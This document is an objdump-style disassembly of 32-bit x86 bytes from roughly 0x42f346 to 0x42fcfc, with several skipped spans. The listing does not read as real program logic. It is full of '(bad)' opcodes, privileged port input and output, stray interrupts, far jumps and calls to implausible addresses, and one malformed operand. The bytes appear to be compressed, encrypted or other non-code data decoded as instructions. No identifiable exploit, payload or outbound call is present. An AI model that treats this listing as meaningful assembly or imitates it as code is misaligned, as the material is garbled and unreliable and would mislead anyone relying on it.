  42f346:	daa    
  42f347:	in     al,dx
  42f348:	and    cl,bl
  42f34a:	test   BYTE PTR [ecx-0x74],bh
  42f34d:	jmp    0x42f30a
  42f34f:	mov    ebp,0x60e1ae40
  42f354:	ror    bh,0xb6
  42f357:	cmp    BYTE PTR [eax+0x27],bh
  42f35a:	mov    ebx,0xc429be7d
  42f35f:	out    dx,eax
  42f360:	(bad)  
  42f361:	sub    eax,0x67728bdb
  42f366:	xor    eax,0xc77bffe6
  42f36b:	aaa    
  42f36c:	cli    
  42f36d:	fiadd  DWORD PTR [ecx]
  42f36f:	and    dh,0x13
  42f372:	cwde   
  42f373:	and    DWORD PTR [eax+0x2784564],eax
  42f379:	scas   al,BYTE PTR es:[edi]
  42f37a:	mov    WORD PTR [ebp-0x7a6d59d0],es
  42f380:	xchg   ebx,eax
  42f381:	sub    al,0x34
  42f383:	fs stc 
  42f385:	jo     0x42f336
  42f387:	push   edi
  42f388:	mov    dl,0x31
  42f38a:	mov    ebp,0x2db048b0
  42f38f:	xchg   ecx,eax
  42f390:	push   edi
  42f391:	push   ss
  42f392:	int3   
  42f393:	pop    esp
  42f394:	repz in al,0x44
  42f397:	push   ebp
  42f398:	sbb    BYTE PTR [edi+ebx*8-0x7e],bh
  42f39c:	push   ds
  42f39d:	mov    ch,0xec
  42f39f:	or     DWORD PTR [ebx],ecx
  42f3a1:	lods   eax,DWORD PTR ds:[esi]
  42f3a2:	fdiv   DWORD PTR [edx+edi*2]
  42f3a5:	mov    dl,0x8b
  42f3a7:	inc    ebp
  42f3a8:	sub    al,0xdf
  42f3aa:	pop    ecx
  42f3ab:	or     bh,dh
  42f3ad:	inc    esp
  42f3ae:	scas   eax,DWORD PTR es:[edi]
  42f3af:	pop    esp
  42f3b0:	pop    ebp
  42f3b1:	aas    
  42f3b2:	push   ebp
  42f3b3:	mov    al,ds:0x42b7053d
  42f3b8:	push   0x9c95e4e0
  42f3bd:	mov    WORD PTR [eax-0x3d86bd01],cs
  42f3c3:	mov    edi,0x2e7d3c7b
  42f3c8:	adc    DWORD PTR [ecx-0x74f8ada1],ebx
  42f3ce:	pop    ds
  42f3cf:	dec    edi
  42f3d0:	xor    esi,ebx
  42f3d2:	repnz inc esp
  42f3d4:	fisttp DWORD PTR es:[edx+0x27]
  42f3d8:	out    dx,eax
  42f3d9:	data16 in al,0xa7
  42f3dc:	adc    BYTE PTR [ebp+0x61251167],bl
  42f3e2:	inc    eax
  42f3e3:	test   BYTE PTR [ecx+0x26b0d737],bh
  42f3e9:	sub    ch,cl
  42f3eb:	lds    edi,FWORD PTR [esi]
  42f3ed:	add    ebx,0xd5ddb74a
  42f3f3:	shl    BYTE PTR [esi*4-0x7bc8ec2d],1
  42f3fa:	dec    edx
  42f3fb:	adc    al,0xcf
  42f3fd:	fild   WORD PTR [ebp+esi*2-0x6bb2b77b]
  42f404:	jl     0x42f40e
  42f406:	and    BYTE PTR [edi],bh
  42f408:	or     al,0x6e
  42f40a:	sbb    eax,0xe6863a35
  42f40f:	mov    ah,0x27
  42f411:	xchg   esi,eax
  42f412:	xor    esi,ebx
  42f414:	daa    
  42f415:	xor    al,0x82
  42f417:	stos   DWORD PTR es:[edi],eax
  42f418:	add    eax,0xab0baa6f
  42f41d:	(bad)  
  42f41e:	ja     0x42f49f
  42f420:	push   0xffffffb5
  42f422:	sub    DWORD PTR [edx-0x49],eax
  42f425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f426:	mov    ah,0x74
  42f428:	mov    ebp,0x2fee24d2
  42f42d:	and    al,0x30
  42f42f:	inc    ebp
  42f430:	pop    esi
  42f431:	adc    eax,0x87d8f1
	...
  42f496:	aaa    
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	(bad)  
  42f4a3:	std    
  42f4a4:	adc    BYTE PTR [ecx+ebp*8],bl
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    dl,bl
  42f4af:	pusha  
  42f4b0:	xor    DWORD PTR [ecx-0x7ee3925f],esp
  42f4b6:	push   DWORD PTR [ebx]
  42f4b8:	std    
  42f4b9:	cmp    eax,0xf1ab47d0
  42f4be:	mov    ds:0xd38ff524,al
  42f4c3:	dec    edi
  42f4c5:	pop    esi
  42f4c6:	push   ebx
  42f4c7:	push   es
  42f4c8:	inc    ecx
  42f4c9:	arpl   WORD PTR [edi-0x742ccec9],di
  42f4cf:	jbe    0x42f4a4
  42f4d1:	sbb    BYTE PTR [ecx-0x2716a198],dl
  42f4d7:	das    
  42f4d8:	or     BYTE PTR [edi],ch
  42f4da:	push   0xffffff90
  42f4dc:	je     0x42f482
  42f4de:	mov    ebp,0xd3103a52
  42f4e4:	pop    ebx
  42f4e5:	(bad)  
  42f4e6:	pop    ss
  42f4e7:	sbb    DWORD PTR ds:0x47ff247f,0x38
  42f4ee:	add    bl,BYTE PTR [edx-0x2b]
  42f4f1:	sti    
  42f4f2:	mov    ch,0x18
  42f4f4:	std    
  42f4f5:	loope  0x42f4db
  42f4f7:	test   BYTE PTR [ebp+edx*1+0x5dbc53de],al
  42f4fe:	adc    al,0x28
  42f500:	sub    ebx,DWORD PTR [edi]
  42f502:	xor    dl,BYTE PTR [esi+edi*8]
  42f505:	dec    ebp
  42f506:	mov    gs,WORD PTR [edx+0x6a934aba]
  42f50c:	pop    ds
  42f50d:	pop    ss
  42f50e:	dec    edx
  42f50f:	outs   dx,BYTE PTR ds:[esi]
  42f510:	je     0x42f56b
  42f512:	fwait
  42f513:	add    ebx,DWORD PTR cs:[ebp-0x4d66e287]
  42f51a:	mov    ebp,0xc5578210
  42f51f:	test   eax,0x4c054f81
  42f524:	jae    0x42f581
  42f526:	dec    edi
  42f527:	daa    
  42f528:	xor    eax,0xde286ea9
  42f52d:	nop    DWORD PTR [edi]
  42f530:	mov    ds:0xec30b76e,al
  42f535:	xor    eax,0x43195fdf
  42f53a:	push   esp
  42f53b:	cmp    ecx,eax
  42f53d:	loop   0x42f59c
  42f53f:	call   0x2d18a9c4
  42f544:	popf   
  42f545:	std    
  42f546:	out    0xc6,al
  42f548:	aas    
  42f549:	lds    esi,FWORD PTR [ebx]
  42f54b:	out    dx,eax
  42f54c:	outs   dx,DWORD PTR ds:[esi]
  42f54d:	pop    ebx
  42f54e:	mov    ebx,0xba532a14
  42f553:	pop    esi
  42f554:	xor    eax,0x7453ff38
  42f559:	popf   
  42f55a:	pop    ebp
  42f55b:	xchg   BYTE PTR [ebp-0x547020],dl
  42f561:	cmp    eax,esp
  42f563:	hlt    
  42f564:	shl    BYTE PTR [esi],cl
  42f566:	or     dh,BYTE PTR [ebx+0x1b]
  42f569:	pop    esi
  42f56a:	aas    
  42f56b:	jg     0x42f59b
  42f56d:	and    al,0x7c
  42f56f:	xor    BYTE PTR [edi+0x7c],cl
  42f572:	cmp    eax,0xbea224e6
  42f577:	ret    0x8fc9
  42f57a:	cmp    esp,esp
  42f57c:	mov    ds:0xf3ded078,al
  42f581:	xchg   ebp,eax
  42f582:	or     edi,DWORD PTR ds:0x1e4b2f97
  42f588:	mov    cl,0x14
  42f58a:	push   ecx
  42f58b:	mov    al,ds:0xc2326d23
  42f590:	cli    
  42f591:	pop    ebx
  42f592:	cmp    eax,0xda7b9e0
  42f597:	sti    
  42f598:	pop    ebx
  42f599:	push   cs
  42f59a:	test   al,0xb3
  42f59c:	pop    eax
  42f59d:	sub    edx,DWORD PTR [edi]
  42f59f:	jae    0x42f533
  42f5a1:	sbb    bh,dl
  42f5a3:	mov    dl,0x47
  42f5a5:	test   eax,0xfeaa1231
  42f5aa:	leave  
  42f5ab:	push   es
  42f5ac:	stc    
  42f5ad:	mov    eax,ds:0x8c381bc1
  42f5b2:	(bad)  
  42f5b3:	out    dx,al
  42f5b4:	push   esi
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x27]
  42f623:	stc    
  42f624:	mov    ecx,0x1fbf0f9
  42f629:	add    BYTE PTR [edi],al
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [esi+0x4e],bh
  42f630:	or     BYTE PTR [edx+ebp*8+0x4],0x7c
  42f635:	adc    bl,bh
  42f637:	xor    al,0x4b
  42f639:	aad    0x50
  42f63b:	pop    edx
  42f63c:	jl     0x42f5c8
  42f63e:	pushf  
  42f63f:	dec    ebx
  42f640:	mov    bl,0xda
  42f642:	loope  0x42f6ad
  42f644:	adc    eax,0xea163a98
  42f649:	sub    esi,esi
  42f64b:	push   ss
  42f64c:	jb     0x42f69b
  42f64e:	test   BYTE PTR [edi+0x30c1a918],cl
  42f654:	std    
  42f655:	scas   eax,DWORD PTR es:[edi]
  42f656:	ins    BYTE PTR es:[edi],dx
  42f657:	arpl   dx,cx
  42f659:	push   0xddbb5ac6
  42f65e:	jno    0x42f6db
  42f660:	xchg   DWORD PTR [ebp-0x2db1a286],esi
  42f666:	cmp    al,0x8c
  42f669:	imul   edx,DWORD PTR [edx+0x1d],0x68
  42f66d:	xor    dl,BYTE PTR [ebp+edi*1-0x14ddecb4]
  42f674:	push   edx
  42f675:	inc    DWORD PTR [ecx]
  42f677:	and    al,0xe6
  42f679:	cs ret 0xf790
  42f67d:	ret    0x48ca
  42f680:	mov    ecx,0xe57ace70
  42f685:	dec    ebx
  42f686:	mov    edi,0xbcbc479e
  42f68b:	adc    esp,ebp
  42f68d:	fwait
  42f68e:	xchg   esi,eax
  42f68f:	ror    esi,cl
  42f691:	mov    esi,0xd0de946b
  42f696:	(bad)  
  42f697:	push   ebp
  42f698:	or     ebp,DWORD PTR [ebp+0x45515227]
  42f69e:	pop    ecx
  42f69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6a0:	inc    ebp
  42f6a1:	mov    DWORD PTR [ebx+0x5f],esi
  42f6a4:	iret   
  42f6a5:	lods   al,BYTE PTR ds:[esi]
  42f6a6:	fdiv   QWORD PTR [ebp+ebp*1+0x719cc2a8]
  42f6ad:	icebp  
  42f6ae:	pop    es
  42f6af:	xlat   BYTE PTR ds:[ebx]
  42f6b0:	test   BYTE PTR [ecx-0x164c9204],ch
  42f6b6:	lahf   
  42f6b7:	js     0x42f725
  42f6b9:	sub    al,BYTE PTR [esi+0x7b2f7dce]
  42f6bf:	inc    edi
  42f6c0:	les    edx,FWORD PTR [eax+esi*8-0x672936f6]
  42f6c7:	add    eax,0xe7bddd75
  42f6cc:	sbb    al,0x4c
  42f6ce:	bound  edx,QWORD PTR [ebx-0x47]
  42f6d1:	cwde   
  42f6d2:	lea    ebp,[edx]
  42f6d4:	test   al,0xb0
  42f6d6:	cli    
  42f6d7:	pop    edi
  42f6d8:	stos   DWORD PTR es:[edi],eax
  42f6d9:	(bad)  
  42f6da:	repz mov al,0xd5
  42f6dd:	jg     0x42f740
  42f6df:	in     eax,0x3
  42f6e1:	add    ebp,DWORD PTR [edi+0x25a3091c]
  42f6e7:	jge    0x42f6df
  42f6e9:	jnp    0x42f747
  42f6eb:	(bad)  
  42f6ec:	inc    ebx
  42f6ed:	cs sub al,0x7d
  42f6f0:	popa   
  42f6f1:	jns    0x42f737
  42f6f3:	pop    ds
  42f6f4:	ret    
  42f6f5:	jns    0x42f690
  42f6f7:	and    eax,DWORD PTR [esi+0x3c5927fb]
  42f6fd:	pushf  
  42f6fe:	idiv   esi
  42f700:	dec    edi
  42f701:	enter  0xc2dc,0xc0
  42f705:	pushf  
  42f706:	inc    edi
  42f707:	or     DWORD PTR [edx],ebx
  42f709:	xchg   ebx,eax
  42f70a:	jp     0x42f764
  42f70c:	out    0x2a,eax
  42f70e:	push   es
  42f70f:	or     eax,0x797d3152
  42f714:	addr16 loop 0x42f741
  42f717:	add    esp,DWORD PTR [esi-0x46a563e8]
  42f71d:	jl     0x42f723
  42f71f:	mov    bh,0x9a
  42f721:	adc    DWORD PTR [eax+ecx*4+0x3742cf86],edi
  42f728:	jl     0x42f6ef
  42f72a:	jle    0x42f73a
  42f72c:	cli    
  42f72d:	sbb    DWORD PTR [eax+0xe5f0653],esp
  42f733:	inc    eax
  42f734:	jg     0x42f736
	...
  42f796:	jno    0x42f739
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	add    bl,dh
  42f7a4:	sub    bl,BYTE PTR [esi]
  42f7a6:	idiv   esp
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [edx-0x6f605b24],dh
  42f7b3:	mov    eax,ds:0x25cffd11
  42f7b8:	in     al,0xc6
  42f7ba:	icebp  
  42f7bb:	add    eax,DWORD PTR [esp+esi*1-0x58d20674]
  42f7c2:	sbb    DWORD PTR [eax-0x22],ebx
  42f7c5:	jle    0x42f7f6
  42f7c7:	ret    0x6442
  42f7ca:	gs in  eax,dx
  42f7cc:	mov    bh,0xf0
  42f7ce:	test   DWORD PTR [ebp+0x5f081075],edx
  42f7d4:	xchg   ecx,ecx
  42f7d6:	jo     0x42f78a
  42f7d8:	stos   DWORD PTR es:[edi],eax
  42f7d9:	into   
  42f7da:	or     ch,bl
  42f7dc:	out    dx,al
  42f7dd:	jg     0x42f848
  42f7df:	outs   dx,BYTE PTR ds:[esi]
  42f7e0:	sbb    dh,BYTE PTR [edx+0x1ee30111]
  42f7e6:	imul   BYTE PTR [esi]
  42f7e8:	xchg   edi,eax
  42f7e9:	not    BYTE PTR [ebp-0x6c]
  42f7ec:	pop    eax
  42f7ed:	mov    esi,gs
  42f7ef:	xor    DWORD PTR [esi-0x2c],edi
  42f7f2:	mov    BYTE PTR [edi+0x3b],ch
  42f7f5:	icebp  
  42f7f6:	lods   al,BYTE PTR ds:[esi]
  42f7f7:	call   0xb8eff81b
  42f7fc:	cmp    DWORD PTR [eax-0x58],esp
  42f7ff:	push   ebx
  42f800:	jmp    0x550a:0x527b4177
  42f807:	test   al,0x2a
  42f809:	test   al,0x72
  42f80b:	imul   BYTE PTR [esi-0x16]
  42f80e:	and    eax,0xb43881
  42f813:	add    edx,esi
  42f815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f816:	mov    ch,0x1c
  42f818:	mov    dh,0x71
  42f81a:	stc    
  42f81b:	push   0xeef68be2
  42f820:	mov    ds:0x956dd886,eax
  42f825:	mov    cs,WORD PTR [edx-0x300f0b34]
  42f82b:	cmp    al,0x5b
  42f82d:	in     al,0x6c
  42f82f:	lahf   
  42f830:	jmp    0xc251066d
  42f835:	pop    es
  42f836:	call   0xe97b:0x5a257e95
  42f83d:	sar    BYTE PTR [ebx+0x32],0x49
  42f841:	xor    al,0x6b
  42f843:	lods   al,BYTE PTR ds:[esi]
  42f844:	mov    dl,0x65
  42f846:	sbb    DWORD PTR ds:0x80a51f52,ecx
  42f84c:	mov    al,0xc4
  42f84e:	or     BYTE PTR cs:[edx+0x69602183],0x80
  42f856:	mov    edx,0x4eef4f3c
  42f85b:	leave  
  42f85c:	inc    ebx
  42f85d:	sub    BYTE PTR [edx-0x4c],cl
  42f860:	pop    es
  42f861:	mov    dl,0x43
  42f863:	xor    ah,al
  42f865:	adc    cl,BYTE PTR [edx-0x398249ac]
  42f86b:	in     al,dx
  42f86c:	xor    ebx,DWORD PTR [edx-0x7b]
  42f86f:	dec    edx
  42f870:	test   DWORD PTR ds:0x60ca9486,0xa38e1a7
  42f87a:	mov    ah,0x99
  42f87c:	or     ch,BYTE PTR [edx-0x76]
  42f87f:	je     0x42f845
  42f881:	cmp    BYTE PTR [edi+0x60],ah
  42f884:	adc    eax,0x783e5183
  42f889:	or     ebx,DWORD PTR [esi+0x28]
  42f88c:	psubw  mm1,QWORD PTR [edi]
  42f88f:	xlat   BYTE PTR ds:[ebx]
  42f890:	and    dh,BYTE PTR [ecx]
  42f892:	push   es
  42f893:	jne    0x42f8d9
  42f895:	fistp  DWORD PTR [ebp-0x1cd81449]
  42f89b:	push   ebp
  42f89c:	xor    BYTE PTR [edx-0x6c],cl
  42f89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8a0:	mov    bl,BYTE PTR [ecx+0x7e]
  42f8a3:	leave  
  42f8a4:	jbe    0x42f8d0
  42f8a6:	mov    bl,0x7f
  42f8a8:	pusha  
  42f8a9:	sub    ebx,DWORD PTR [ecx]
  42f8ab:	int3   
  42f8ac:	fcom   QWORD PTR [esi]
  42f8ae:	outs   dx,BYTE PTR ds:[esi]
  42f8af:	ins    BYTE PTR es:[edi],dx
  42f8b0:	xor    DWORD PTR [ecx],0x7fb9aa
	...
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x56e5b464],1
  42f925:	(bad)  
  42f926:	(bad)  
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    ch,dl
  42f92f:	pop    edi
  42f930:	call   0x816fb1d2
  42f935:	push   ebp
  42f936:	hlt    
  42f937:	push   cs
  42f938:	push   ecx
  42f939:	call   0x28e5d1ee
  42f93e:	mov    bl,0x98
  42f940:	in     al,0x10
  42f942:	mov    edi,DWORD PTR [esp+eax*4-0x5]
  42f946:	push   ss
  42f947:	repnz sbb DWORD PTR [ecx],0x56d91552
  42f94e:	ret    
  42f94f:	les    esi,FWORD PTR [ebx-0x7e38285a]
  42f955:	ret    0x1195
  42f958:	push   ebp
  42f959:	push   ss
  42f95a:	js     0x42f8f7
  42f95c:	pop    ebp
  42f95d:	out    0x42,al
  42f95f:	or     esp,DWORD PTR [edi+0x2e]
  42f962:	xor    eax,0xfea0a25b
  42f967:	mov    ds:0x85f77db2,eax
  42f96c:	stc    
  42f96d:	push   ebx
  42f96e:	push   ax
  42f970:	sub    BYTE PTR [edx+0x38],bl
  42f973:	mov    ebp,0x6c4c59ef
  42f978:	sbb    al,dl
  42f97a:	dec    ebx
  42f97b:	cmp    al,0x23
  42f97d:	nop
  42f97e:	jae    0x42f9b2
  42f980:	scas   al,BYTE PTR es:[edi]
  42f981:	push   0xd3911536
  42f986:	jmp    0x250d:0x2c22dfd0
  42f98d:	add    ah,bl
  42f98f:	mov    cl,0xb3
  42f991:	inc    ebp
  42f992:	xchg   esp,eax
  42f993:	pop    eax
  42f994:	mov    bh,0x55
  42f996:	or     eax,DWORD PTR [ecx]
  42f998:	(bad)  [ebx+0x412be77f]
  42f99e:	stc    
  42f99f:	(bad)  
  42f9a0:	push   ebp
  42f9a1:	pop    es
  42f9a2:	rcl    DWORD PTR ds:0x5d3af80f,cl
  42f9a8:	ins    BYTE PTR es:[edi],dx
  42f9a9:	xchg   ch,dh
  42f9ab:	jb     0x42f935
  42f9ad:	adc    esi,DWORD PTR [esi]
  42f9af:	xchg   esp,eax
  42f9b0:	fld    TBYTE PTR [eax-0x21]
  42f9b3:	popa   
  42f9b4:	mov    ecx,0x31d2116a
  42f9b9:	arpl   ax,ax
  42f9bb:	add    BYTE PTR [eax-0x6997b26b],al
  42f9c1:	popf   
  42f9c2:	pop    edi
  42f9c3:	inc    ebx
  42f9c4:	or     edx,DWORD PTR [ecx-0x3e]
  42f9c7:	push   ss
  42f9c8:	retf   
  42f9c9:	sub    BYTE PTR [eax+0x1d],bh
  42f9cc:	and    DWORD PTR ds:0xe3c54277,edi
  42f9d2:	ins    BYTE PTR es:[edi],dx
  42f9d3:	fs inc eax
  42f9d5:	and    eax,0x64a991d1
  42f9da:	dec    ecx
  42f9db:	lds    edi,FWORD PTR ds:0xb0e1de30
  42f9e1:	fidivr WORD PTR [edx+0x9]
  42f9e4:	(bad)
  42f9e7:	shl    BYTE PTR [ecx],1
  42f9e9:	push   edx
  42f9ea:	push   edi
  42f9eb:	and    eax,0xb7a0516b
  42f9f0:	fistp  WORD PTR [esi+0x753c85a9]
  42f9f6:	push   ds
  42f9f7:	pop    esp
  42f9f8:	and    DWORD PTR [ecx],ebp
  42f9fa:	or     DWORD PTR [ebx],ebp
  42f9fc:	sbb    DWORD PTR [eax-0x8],edi
  42f9ff:	add    al,0xea
  42fa01:	les    edx,FWORD PTR [edi]
  42fa03:	cdq    
  42fa04:	mov    ds:0xee5f0d20,eax
  42fa09:	sub    eax,0x306f7fef
  42fa0e:	mov    ebx,0x534178f0
  42fa13:	mov    bl,0x3a
  42fa15:	adc    eax,0x4a08572d
  42fa1a:	or     BYTE PTR ds:0xf85b8292,dl
  42fa20:	aad    0xbb
  42fa22:	aad    0x97
  42fa24:	dec    ecx
  42fa25:	and    dl,cl
  42fa27:	xchg   esi,eax
  42fa28:	mov    DWORD PTR [edi-0x10],edx
  42fa2b:	jne    0x42fa85
  42fa2d:	stos   DWORD PTR es:[edi],eax
  42fa2e:	hlt    
  42fa2f:	push   edx
  42fa30:	mov    al,ds:0x59886fa1
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	aaa    
  42faa3:	imul   edx,DWORD PTR ds:0x1ff052b,0x10700
  42faad:	add    BYTE PTR [eax],cl
  42faaf:	out    dx,eax
  42fab0:	leave  
  42fab1:	push   edi
  42fab2:	not    bl
  42fab4:	stos   BYTE PTR es:[edi],al
  42fab5:	fisubr WORD PTR [esp+esi*4-0x125424ec]
  42fabc:	adc    DWORD PTR [esp+eax*4+0x1],esp
  42fac0:	enter  0xa4fd,0x6b
  42fac4:	cmp    BYTE PTR es:[ebp-0x5a],bl
  42fac8:	jmp    0x42fa98
  42faca:	xor    DWORD PTR [ebx-0x37c005e6],esi
  42fad0:	xor    DWORD PTR [ebp-0x24],eax
  42fad3:	clc    
  42fad4:	and    ecx,DWORD PTR [edx-0x2db983f4]
  42fada:	pop    DWORD PTR [ecx]
  42fadc:	sub    ax,0x48d5
  42fae0:	pop    edi
  42fae1:	and    al,0xfd
  42fae3:	add    eax,0x7a17bf39
  42fae8:	fcom   QWORD PTR [edi-0x77]
  42faeb:	mov    ecx,0xc5e37766
  42faf0:	les    esp,FWORD PTR [esp+ebx*2+0x5b]
  42faf4:	outs   dx,BYTE PTR ds:[esi]
  42faf5:	(bad)  
  42faf6:	fnstenv [ebp*8-0x1ea0a8b8]
  42fafd:	mov    cl,0x4
  42faff:	or     al,0x17
  42fb01:	mov    dh,0xab
  42fb03:	lahf   
  42fb04:	aam    0xf6
  42fb06:	repnz inc edi
  42fb08:	mov    DWORD PTR [edi],0x8738d998
  42fb0e:	pop    ss
  42fb0f:	jbe    0x42fadd
  42fb11:	call   0xf06f29d7
  42fb16:	adc    al,0x75
  42fb18:	in     eax,0x21
  42fb1a:	outs   dx,BYTE PTR ds:[esi]
  42fb1b:	hlt    
  42fb1c:	add    ebx,esp
  42fb1e:	out    dx,al
  42fb1f:	xor    al,0x84
  42fb21:	mov    ch,0x23
  42fb23:	into   
  42fb24:	shr    bl,cl
  42fb26:	clc    
  42fb27:	out    dx,al
  42fb28:	(bad)  
  42fb29:	outs   dx,BYTE PTR ds:[esi]
  42fb2a:	test   bl,dl
  42fb2c:	xor    DWORD PTR [ecx+edi*4+0x55f87ca5],ecx
  42fb33:	(bad)  
  42fb34:	outs   dx,BYTE PTR ds:[esi]
  42fb35:	outs   dx,DWORD PTR ds:[si]
  42fb37:	jbe    0x42fb92
  42fb39:	arpl   WORD PTR [esi+0x3c],si
  42fb3c:	sbb    al,0x4
  42fb3e:	push   ds
  42fb3f:	repz push esi
  42fb41:	or     ebx,ebp
  42fb43:	out    dx,eax
  42fb44:	lods   al,BYTE PTR ds:[esi]
  42fb45:	or     ebp,DWORD PTR [esi+0x6f6f742d]
  42fb4b:	jb     0x42fbc3
  42fb4d:	inc    edi
  42fb4e:	out    dx,al
  42fb4f:	push   edx
  42fb50:	sbb    eax,0xef10440d
  42fb55:	pusha  
  42fb56:	test   eax,0x4e123dab
  42fb5b:	es sahf 
  42fb5d:	add    al,BYTE PTR [ecx]
  42fb5f:	daa    
  42fb60:	jle    0x42fb66
  42fb62:	aad    0x2
  42fb64:	jne    0x42fb1d
  42fb66:	fcomip st,st(4)
  42fb68:	imul   BYTE PTR [ebx-0x38893d74]
  42fb6e:	cs pop esp
  42fb70:	daa    
  42fb71:	pop    esp
  42fb72:	jle    0x42fb52
  42fb74:	jae    0x42fbac
  42fb76:	int    0xad
  42fb78:	cmp    eax,0x8d1fc113
  42fb7d:	mov    dh,0x66
  42fb7f:	lds    eax,FWORD PTR [ebx+0x6f]
  42fb82:	push   ebp
  42fb83:	retf   0xcd9d
  42fb86:	mov    esi,0x137cd718
  42fb8b:	inc    edi
  42fb8c:	jmp    0xa83bacac
  42fb91:	push   eax
  42fb92:	xor    eax,0x75edf13a
  42fb97:	retf   
  42fb98:	mov    ebp,DWORD PTR [edi+0x3d79238c]
  42fb9e:	ret    0xe5ae
  42fba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fba2:	outs   dx,DWORD PTR ds:[esi]
  42fba3:	enter  0x4bf4,0xa6
  42fba7:	fcomip st,st(1)
  42fba9:	shl    DWORD PTR [ebp-0x24],1
  42fbac:	dec    esp
  42fbad:	aas    
  42fbae:	xor    bh,dl
  42fbb0:	jae    0x42fc0e
  42fbb2:	xor    edi,eax
  42fbb4:	cmp    DWORD PTR [eax],eax
	...
  42fc16:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc1c:	mov    ebx,0x5607ea9a
  42fc21:	sahf   
  42fc22:	outs   dx,BYTE PTR ds:[esi]
  42fc23:	mov    esi,0xcb01a
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edi+eiz*8+0xbb1350b],dh
  42fc34:	clc    
  42fc35:	xor    BYTE PTR [edi-0x1],0x85
  42fc39:	neg    DWORD PTR [edi+0x6ecf2be5]
  42fc3f:	es int 0xad
  42fc42:	shl    DWORD PTR [ebx-0x9],0xdb
  42fc46:	mov    eax,0x51fe9f4c
  42fc4b:	inc    ecx
  42fc4c:	or     DWORD PTR [ecx+ecx*2+0x5],ebx
  42fc50:	inc    edi
  42fc51:	jbe    0x42fc1f
  42fc53:	sub    ah,bl
  42fc55:	test   al,0xc3
  42fc57:	inc    eax
  42fc58:	bound  ebx,QWORD PTR [ecx+0x11]
  42fc5b:	cli    
  42fc5c:	xchg   edx,eax
  42fc5d:	out    0x27,al
  42fc5f:	daa    
  42fc60:	adc    eax,DWORD PTR [esi]
  42fc62:	xchg   BYTE PTR [edx],ch
  42fc64:	ss jl  0x42fcc9
  42fc67:	push   ss
  42fc68:	pop    eax
  42fc69:	push   edi
  42fc6a:	pop    es
  42fc6b:	mov    ds:0xb6a38b54,eax
  42fc71:	in     al,0x6d
  42fc73:	fild   QWORD PTR [eax+0x6e04b53c]
  42fc79:	mov    ecx,0x620c9b77
  42fc7e:	enter  0x3c00,0x84
  42fc82:	loope  0x42fc0a
  42fc84:	aas    
  42fc85:	sbb    edx,DWORD PTR [ebx+0x1c]
  42fc88:	mov    ch,0x61
  42fc8a:	retf   0x3359
  42fc8d:	inc    DWORD PTR [esi+0x5a]
  42fc90:	mov    ?,ecx
  42fc92:	jmp    0x42fc5a
  42fc94:	loop   0x42fc57
  42fc96:	lahf   
  42fc97:	retf   0xe546
  42fc9a:	ins    BYTE PTR es:[edi],dx
  42fc9b:	test   eax,0xae9071b6
  42fca0:	inc    DWORD PTR [ecx-0x410a75fa]
  42fca6:	xor    dh,0x14
  42fca9:	icebp  
  42fcaa:	or     al,0xb
  42fcac:	and    ecx,DWORD PTR [ecx+ebp*4+0x1afbd41b]
  42fcb3:	pop    es
  42fcb4:	push   ecx
  42fcb5:	dec    esp
  42fcb6:	jno    0x42fcd4
  42fcb8:	mov    ah,0xc0
  42fcba:	fwait
  42fcbb:	aas    
  42fcbc:	or     DWORD PTR [ebx-0x4c],0xffffffc7
  42fcc0:	out    0x94,eax
  42fcc2:	dec    esi
  42fcc3:	dec    edx
  42fcc4:	mov    esi,0x41aadb73
  42fcc9:	dec    esi
  42fcca:	xchg   edx,eax
  42fccb:	xor    esp,DWORD PTR [edi+0x5c]
  42fcce:	adc    dl,BYTE PTR [ebp-0x56]
  42fcd1:	out    dx,al
  42fcd2:	push   ecx
  42fcd3:	mov    ecx,0x5f37a66a
  42fcd8:	in     eax,0x6e
  42fcda:	stos   BYTE PTR es:[edi],al
  42fcdb:	add    al,0x5d
  42fcdd:	xor    eax,0xff236064
  42fce2:	cld    
  42fce3:	lods   eax,DWORD PTR ds:[esi]
  42fce4:	int3   
  42fce5:	xchg   ch,dh
  42fce7:	ja     0x42fd18
  42fce9:	test   al,0xa7
  42fceb:	jbe    0x42fd62
  42fced:	test   eax,0x6851844b
  42fcf2:	clc    
  42fcf3:	sub    eax,0xaa5e7bb3
  42fcf8:	mov    esi,ecx
  42fcfa:	jne    0x42fcc8
  42fcfc:	in     al,0xa
